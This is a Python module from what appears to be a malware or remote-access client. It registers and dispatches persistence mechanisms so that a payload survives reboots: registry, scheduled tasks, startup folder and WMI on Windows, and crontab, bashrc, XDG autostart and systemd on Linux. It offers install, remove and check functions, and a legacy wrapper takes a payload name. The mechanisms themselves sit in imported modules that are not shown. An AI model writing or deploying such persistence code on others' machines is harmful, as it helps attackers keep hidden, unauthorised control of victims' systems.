import os

from client.modules.persist.manager import PersistenceManager, PersistenceResult

from client.modules.persist.crontab import CrontabPersistence
from client.modules.persist.systemd import SystemdPersistence
from client.modules.persist.bashrc import BashrcPersistence
from client.modules.persist.xdg import XdgAutostartPersistence

from client.modules.persist.registry import RegistryPersistence
from client.modules.persist.scheduled_task import ScheduledTaskPersistence
from client.modules.persist.startup_folder import StartupFolderPersistence
from client.modules.persist.wmi import WMIPersistence


def _build_manager() -> PersistenceManager:
    mgr = PersistenceManager(None)
    if os.name == 'nt':
        mgr.register(RegistryPersistence())
        mgr.register(ScheduledTaskPersistence())
        mgr.register(StartupFolderPersistence())
        mgr.register(WMIPersistence())
    else:
        mgr.register(CrontabPersistence())
        mgr.register(BashrcPersistence())
        mgr.register(XdgAutostartPersistence())
        mgr.register(SystemdPersistence())
    return mgr


def install_persistence(method: str, **kwargs) -> str:
    mgr = _build_manager()
    result = mgr.install(method, **kwargs)
    return _format_result(result)


def remove_persistence(method: str, **kwargs) -> str:
    mgr = _build_manager()
    result = mgr.remove(method, **kwargs)
    return _format_result(result)


def check_persistence(method: str = None) -> str:
    mgr = _build_manager()
    results = mgr.check(method)
    lines = []
    for r in results:
        lines.append(f'[{r.method}] {r.message}')
        if r.details:
            lines.append(f'  {r.details}')
    return '\n'.join(lines) if lines else '[-] No persistence methods available'


def list_methods() -> str:
    mgr = _build_manager()
    methods = mgr.list_methods()
    return f'[+] Available persistence methods: {", ".join(methods)}'


def install_legacy(platform, reg_name, copy_name) -> str:
    """Legacy compatibility wrapper — uses crontab or registry depending on platform."""
    if hasattr(platform, 'install_persistence'):
        return platform.install_persistence(reg_name, copy_name)
    return install_persistence('crontab', payload_name=copy_name)


def _format_result(result: PersistenceResult) -> str:
    prefix = '[+]' if result.success else '[-]'
    msg = f'{prefix} {result.message}'
    if result.details:
        msg += f'\n  -> {result.details}'
    return msg
